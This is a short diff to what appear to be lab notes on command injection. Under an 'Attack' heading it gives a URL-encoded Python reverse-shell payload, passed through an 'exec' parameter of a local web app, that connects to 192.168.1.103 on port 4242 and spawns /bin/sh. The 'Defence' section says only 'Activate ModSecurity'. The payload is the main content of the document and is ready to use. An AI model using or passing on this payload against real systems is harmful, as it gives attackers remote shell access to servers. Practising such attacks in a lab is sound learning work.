@@ -1,3 +1,5 @@
+Attack
+
 Resource: https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#python
 
 Script:
@@ -10,3 +12,8 @@ export%20RHOST%3D%22192.168.1.103%22%3Bexport%20RPORT%3D4242%3Bpython%20-c%20%27
 
 Result: http://127.0.0.1:8080/?exec=export%20RHOST%3D%22192.168.1.103%22%3Bexport%20RPORT%3D4242%3Bpython%20-c%20%27import%20socket%2Cos%2Cpty%3Bs%3Dsocket.socket%28%29%3Bs.connect%28%28os.getenv%28%22RHOST%22%29%2Cint%28os.getenv%28%22RPORT%22%29%29%29%29%3B%5Bos.dup2%28s.fileno%28%29%2Cfd%29%20for%20fd%20in%20%280%2C1%2C2%29%5D%3Bpty.spawn%28%22%2Fbin%2Fsh%22%29%27
 NOTE: port
+
+
+Defence
+
+Activate ModSecurity
